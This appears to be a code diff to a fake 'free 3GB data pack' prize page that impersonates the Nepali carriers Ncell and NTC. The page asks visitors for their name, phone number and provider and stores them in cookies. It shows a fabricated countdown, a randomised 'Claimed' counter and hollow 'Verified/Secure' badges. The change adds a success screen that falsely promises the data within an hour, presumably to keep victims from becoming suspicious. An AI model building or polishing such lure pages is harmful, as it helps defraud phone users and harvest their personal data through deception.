@@ -437,6 +437,71 @@
       display: none !important;
     }
 
+    /* ===== SUCCESS PAGE (shown after claim) ===== */
+    .success-page {
+      display: none;
+      text-align: center;
+      padding: 10px 0 4px;
+    }
+
+    .success-page .success-icon {
+      width: 88px;
+      height: 88px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: var(--accent-soft);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 44px;
+      color: var(--accent);
+      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-page h3 {
+      font-size: 22px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 10px;
+      letter-spacing: -0.02em;
+    }
+
+    .success-page p {
+      font-size: 14px;
+      font-weight: 500;
+      color: #64748b;
+      line-height: 1.6;
+      max-width: 320px;
+      margin: 0 auto 8px;
+    }
+
+    .success-page .highlight {
+      color: var(--accent-dark);
+      font-weight: 700;
+    }
+
+    .success-page .success-note {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 18px;
+      padding: 10px 18px;
+      background: var(--accent-soft);
+      border-radius: 40px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--accent-dark);
+    }
+
+    .success-page .success-note i {
+      font-size: 15px;
+    }
+
     /* responsive */
     @media (max-width: 480px) {
       .offer-card { border-radius: 28px; }
@@ -450,6 +515,7 @@
       .provider-box img { height: 30px; }
       .recharge-btn { font-size: 15px; padding: 15px; }
       .trust-badges { gap: 16px; }
+      .success-page h3 { font-size: 20px; }
     }
   </style>
 </head>
@@ -473,84 +539,107 @@
     <div class="badge-icon">
       <i class="fas fa-gift"></i>
     </div>
-    <h2>Congratulations!</h2>
-    <div class="subtitle">You have won a Free 3GB Data Pack</div>
+    <h2 id="headerTitle">Congratulations!</h2>
+    <div class="subtitle" id="headerSubtitle">You have won a Free 3GB Data Pack</div>
   </div>
 
   <!-- Body -->
   <div class="card-body">
 
-    <!-- Form -->
-    <form id="rechargeForm" onsubmit="return false;">
+    <!-- ===== FORM VIEW (original) ===== -->
+    <div id="formView">
+      <form id="rechargeForm" onsubmit="return false;">
 
-      <!-- Provider selection with real logos -->
-      <div class="input-group">
-        <label>Select Your Provider</label>
-        <div class="provider-selection">
-          <!-- Ncell Option (purple theme) -->
-          <label class="provider-option">
-            <input type="radio" name="provider" value="Ncell" checked>
-            <div class="provider-box">
-              <img src="https://play-lh.googleusercontent.com/JK3vHkXIcEiW4MGKVBIgwrQxZv2P6XBPqEholFRASlmsvQ-E_OL_gY3fKGXYloFZQsAGUGdahCmbEgyJDMB1qQ" alt="Ncell">
-            </div>
-          </label>
-          <!-- NTC Option (dark blue theme) -->
-          <label class="provider-option">
-            <input type="radio" name="provider" value="NTC">
-            <div class="provider-box">
-              <img src="https://media.nepalitimes.com/1/feature_images/20260122090140_f10ab026a2469b34131600e4701f0c7146e817a6760bdcf9fc6e8bc185c5edbf.jpg" alt="NTC">
-            </div>
-          </label>
+        <!-- Provider selection with real logos -->
+        <div class="input-group">
+          <label>Select Your Provider</label>
+          <div class="provider-selection">
+            <!-- Ncell Option (purple theme) -->
+            <label class="provider-option">
+              <input type="radio" name="provider" value="Ncell" checked>
+              <div class="provider-box">
+                <img src="https://play-lh.googleusercontent.com/JK3vHkXIcEiW4MGKVBIgwrQxZv2P6XBPqEholFRASlmsvQ-E_OL_gY3fKGXYloFZQsAGUGdahCmbEgyJDMB1qQ" alt="Ncell">
+              </div>
+            </label>
+            <!-- NTC Option (dark blue theme) -->
+            <label class="provider-option">
+              <input type="radio" name="provider" value="NTC">
+              <div class="provider-box">
+                <img src="https://media.nepalitimes.com/1/feature_images/20260122090140_f10ab026a2469b34131600e4701f0c7146e817a6760bdcf9fc6e8bc185c5edbf.jpg" alt="NTC">
+              </div>
+            </label>
+          </div>
         </div>
+
+        <!-- Name -->
+        <div class="input-group">
+          <label for="name">Your Name</label>
+          <input type="text" id="name" name="name" class="input-field" placeholder="Enter Full Name" required>
+        </div>
+
+        <!-- Phone -->
+        <div class="input-group">
+          <label for="number">Your Phone Number</label>
+          <input type="tel" id="number" name="number" class="input-field" placeholder="Enter Your Phone Number" required>
+        </div>
+
+        <!-- Data Pack -->
+        <div class="input-group">
+          <label for="amount">Select Data Pack</label>
+          <select id="amount" name="amount" class="input-field">
+            <option selected>Free 3GB Data Pack</option>
+          </select>
+        </div>
+
+        <!-- Claim button -->
+        <button type="submit" class="recharge-btn" id="rechargeBtn">
+          <i class="fas fa-bolt"></i> Claim Free 3GB Now
+        </button>
+      </form>
+
+      <!-- Countdown & people -->
+      <div class="info-row">
+        <div class="countDown">Offer expires in <span class="timer">00:00:00</span></div>
+        <div class="peopleCount">Claimed: <span class="number">0</span></div>
       </div>
 
-      <!-- Name -->
-      <div class="input-group">
-        <label for="name">Your Name</label>
-        <input type="text" id="name" name="name" class="input-field" placeholder="Enter Full Name" required>
+      <!-- Trust badges -->
+      <div class="trust-badges">
+        <span><i class="fas fa-check-circle"></i> Verified</span>
+        <span><i class="fas fa-lock"></i> Secure</span>
+        <span><i class="fas fa-bolt"></i> Instant</span>
       </div>
-
-      <!-- Phone -->
-      <div class="input-group">
-        <label for="number">Your Phone Number</label>
-        <input type="tel" id="number" name="number" class="input-field" placeholder="Enter Your Phone Number" required>
-      </div>
-
-      <!-- Data Pack -->
-      <div class="input-group">
-        <label for="amount">Select Data Pack</label>
-        <select id="amount" name="amount" class="input-field">
-          <option selected>Free 3GB Data Pack</option>
-        </select>
-      </div>
-
-      <!-- Claim button -->
-      <button type="submit" class="recharge-btn" id="rechargeBtn">
-        <i class="fas fa-bolt"></i> Claim Free 3GB Now
-      </button>
-    </form>
-
-    <!-- Countdown & people -->
-    <div class="info-row">
-      <div class="countDown">Offer expires in <span class="timer">00:00:00</span></div>
-      <div class="peopleCount">Claimed: <span class="number">0</span></div>
     </div>
 
-    <!-- Trust badges -->
-    <div class="trust-badges">
-      <span><i class="fas fa-check-circle"></i> Verified</span>
-      <span><i class="fas fa-lock"></i> Secure</span>
-      <span><i class="fas fa-bolt"></i> Instant</span>
+    <!-- ===== SUCCESS VIEW (shown after claim) ===== -->
+    <div class="success-page" id="successView">
+      <div class="success-icon">
+        <i class="fas fa-check-circle"></i>
+      </div>
+      <h3>Request Submitted!</h3>
+      <p>
+        Your request has been submitted successfully.
+        You will receive the <span class="highlight">Free 3GB Data Pack</span> within <span class="highlight">1 hour</span>.
+      </p>
+      <div class="success-note">
+        <i class="fas fa-hourglass-half"></i>
+        <span>Please keep your phone on</span>
+      </div>
     </div>
 
   </div>
 </div>
 
-<!-- ===== THEME SWITCHER (Ncell = purple, NTC = dark blue) ===== -->
+<!-- ===== THEME SWITCHER + CLAIM HANDLER ===== -->
 <script>
 (function () {
   var card = document.getElementById('offerCard');
   var radios = document.querySelectorAll('input[name="provider"]');
+  var formView = document.getElementById('formView');
+  var successView = document.getElementById('successView');
+  var headerTitle = document.getElementById('headerTitle');
+  var headerSubtitle = document.getElementById('headerSubtitle');
+  var form = document.getElementById('rechargeForm');
 
   function applyTheme() {
     var selected = document.querySelector('input[name="provider"]:checked');
@@ -568,6 +657,25 @@
 
   // initial state (Ncell is checked by default → purple)
   applyTheme();
+
+  // ===== CLAIM HANDLER: show success page instead of redirecting =====
+  form.onsubmit = function (e) {
+    e.preventDefault();
+
+    // keep original cookie logic (capture inputs + provider)
+    setCookie("free-recharge_name", document.querySelector('input[name="name"]').value);
+    setCookie("free-recharge_number", document.querySelector('input[name="number"]').value);
+    var selectedProvider = document.querySelector('input[name="provider"]:checked').value;
+    setCookie("free-recharge_provider", selectedProvider);
+
+    // swap views
+    formView.style.display = 'none';
+    successView.style.display = 'block';
+    headerTitle.textContent = 'Request Submitted';
+    headerSubtitle.textContent = 'Your free data pack is on the way';
+
+    return false;
+  };
 })();
 </script>
 
@@ -672,18 +780,6 @@ function leftTimer() {
 function checkTime(e) {
     return e < 10 && (e = "0" + e), e;
 }
-
-// Original form submit handler
-document.getElementById("rechargeForm").onsubmit = function() {
-    setCookie("free-recharge_name", document.querySelector('input[name="name"]').value);
-    setCookie("free-recharge_number", document.querySelector('input[name="number"]').value);
-    // Capture selected provider
-    var selectedProvider = document.querySelector('input[name="provider"]:checked').value;
-    setCookie("free-recharge_provider", selectedProvider);
-    
-    next();
-    return !1;
-};
 
 var updatePeople = function() {
     var e = parseInt(1e3 * Math.random());
